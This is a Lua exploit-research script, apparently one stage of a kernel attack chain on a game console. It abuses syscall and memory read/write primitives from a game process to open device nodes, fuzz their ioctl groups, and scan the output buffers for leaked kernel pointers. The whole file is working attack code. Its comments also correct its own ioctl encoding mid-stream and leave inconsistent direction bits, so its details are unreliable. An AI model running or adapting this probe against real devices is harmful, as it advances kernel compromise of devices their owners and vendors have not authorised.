-- CRASH_CLASS: MODERATE
-- PROBE 271c: ioctl group discovery across all openable /dev nodes
--
-- 271a/271b showed camera+hid accept ALL groups (catch-all dispatchers).
-- gc/dce/gic/notification0/bt refused all 57 codes — they use different groups.
-- This probe discovers WHICH ioctl group byte each device responds to by
-- trying one OUT-direction code per group (0x00-0xFF) on every node.
--
-- For each group G, we try code 0x80044G01 (OUT, 4 bytes, cmd 0x01).
-- Any ret != -1 means the device dispatches that group.
-- Then we try a larger OUT 0x80404G01 (64 bytes) on responsive groups
-- and scan for kernel pointers in the output.

print("=== PROBE 271c: ioctl group discovery ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local SENTINEL = 0xCAFEBABE
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function path_buf(p)
    local b = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do wd(N(b) + i, 0) end
    for i = 0, #p - 1, 4 do
        local d = 0
        for j = 0, 3 do
            if i + j < #p then d = d + string.byte(p, i + j + 1) * (256 ^ j) end
        end
        wd(N(b) + i, d)
    end
    return b
end

local sc5 = mk(5)
local sc6 = mk(6)
local sc_ioctl = mk(54)

-- All device nodes known to open from game process
local nodes = {
    "gc", "dce", "ajm", "dmem0", "dmem1", "dmem2",
    "camera", "usb", "hid", "bt", "rng", "gic",
    "notification0", "notification1", "notification2",
    "notification3", "notification4", "notification5",
}

-- Open all
print("[A] opening devices")
local fds = {}
for _, nm in ipairs(nodes) do
    local ok1, rv = pcall(function() return sc5(path_buf("/dev/" .. nm), uint64(2)) end)
    local fd = ok1 and N(rv) or -1
    if fd >= 0 and fd < 0x10000 then
        fds[#fds + 1] = {nm, fd}
        print(string.format("    %-16s fd=%d", nm, fd))
    end
end
print(string.format("    opened %d/%d", #fds, #nodes))

-- Buffer for ioctl
local buf = memory.alloc(0x200)
local ba = N(buf)

-- [B] Group discovery: for each device, sweep group 0x00-0xFF
print("")
print("[B] group sweep (OUT 4B code per group)")

local device_groups = {}

for fi = 1, #fds do
    if not alive() then print("DEAD"); break end
    local nm, fd = fds[fi][1], fds[fi][2]
    local responsive = {}

    for g = 0, 255 do
        -- Build code: OUT direction (0x80), size=4 (0x0004), group=g, cmd=0x01
        local code = 0x80040001 + g * 256
        for off = 0, 0x1FC, 4 do wd(ba + off, SENTINEL) end

        local ok, rv = pcall(function()
            return sc_ioctl(uint64(fd), uint64(code), uint64(ba))
        end)
        if not ok then
            -- pcall fail means crash/kill — skip this device
            if not alive() then print("  " .. nm .. " KILLED at group 0x" .. string.format("%02X", g)); break end
        else
            local r = N(rv)
            if r ~= -1 then
                responsive[#responsive + 1] = g
            end
        end
    end

    if #responsive > 0 and #responsive < 250 then
        -- Selective — print each group
        local gs = {}
        for _, g in ipairs(responsive) do gs[#gs + 1] = string.format("%02X", g) end
        print(string.format("  %-16s %d groups: %s", nm, #responsive, table.concat(gs, ",")))
    elseif #responsive >= 250 then
        print(string.format("  %-16s catch-all (%d/256)", nm, #responsive))
    else
        print(string.format("  %-16s no groups respond", nm))
    end
    device_groups[nm] = responsive
end

if not alive() then print("DEAD after sweep"); return end

-- [C] Deep probe: for selective devices, try larger OUT on responsive groups
print("")
print("[C] deep probe on selective devices (OUT 0x100B, sentinel)")

for fi = 1, #fds do
    if not alive() then print("DEAD"); break end
    local nm, fd = fds[fi][1], fds[fi][2]
    local groups = device_groups[nm]
    if not groups or #groups == 0 or #groups > 64 then
        -- skip catch-alls and unresponsive
    else
        for _, g in ipairs(groups) do
            if not alive() then break end
            -- Try OUT with 0x100 bytes (256B) to catch over-copy
            local big_code = 0x80FF0001 + g * 256  -- actually need proper encoding
            -- ioctl code: direction(2) | size(13) | group(8) | cmd(8)
            -- OUT=0x40000000, size=0x100=256, group=g, cmd=0x01
            -- packed: 0x40000000 | (0x100 << 16) | (g << 8) | 0x01
            local code = 0x40000000 + 0x01000000 + g * 256 + 1  -- size=0x100
            -- Wait, that's wrong. Let me redo:
            -- BSD ioctl: _IOC(dir, group, cmd, len)
            -- dir: IOC_OUT=0x40000000
            -- len occupies bits 16-28 (13 bits)
            -- group occupies bits 8-15
            -- cmd occupies bits 0-7
            -- So: 0x40000000 | (0x100 << 16) | (g << 8) | 0x01
            code = 0x40000000 + 0x100 * 0x10000 + g * 0x100 + 0x01
            -- = 0x41000001 + g * 0x100... let me verify:
            -- For g=0x82, cmd=0x01, size=0x100:
            -- 0x40000000 | 0x01000000 | 0x00008200 | 0x00000001
            -- = 0x41008201 -- that's right

            for off = 0, 0x1FC, 4 do wd(ba + off, SENTINEL) end

            local ok, rv = pcall(function()
                return sc_ioctl(uint64(fd), uint64(code), uint64(ba))
            end)
            if not ok then
                if not alive() then
                    print(string.format("  %s KILLED at group 0x%02X", nm, g))
                    break
                end
            else
                local r = N(rv)
                if r ~= -1 then
                    -- Check for buffer modification
                    local modified = 0
                    local first_mod = nil
                    for off = 0, 0x1FC, 4 do
                        local v = rd(ba + off)
                        if v ~= SENTINEL then
                            modified = modified + 1
                            if not first_mod then first_mod = off end
                        end
                    end
                    if modified > 0 then
                        local uv = r; if uv < 0 then uv = uv + 0x100000000 end
                        print(string.format("  %s g=0x%02X ret=0x%X mod=%d first=+0x%X",
                            nm, g, uv, modified, first_mod))
                        -- kptr scan
                        for off = 0, 0x1FC, 4 do
                            local lo = rd(ba + off) or SENTINEL
                            local hi = rd(ba + off + 4) or SENTINEL
                            if lo ~= SENTINEL and hi ~= SENTINEL then
                                local ulo = lo; if ulo < 0 then ulo = ulo + 0x100000000 end
                                local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
                                if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                                    print(string.format("    *** KPTR %s g=0x%02X +0x%X: 0x%08X%08X ***",
                                        nm, g, off, uhi, ulo))
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Close all
for fi = 1, #fds do
    if fds[fi][2] >= 0 then
        pcall(function() sc6(uint64(fds[fi][2])) end)
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 271c COMPLETE ===")
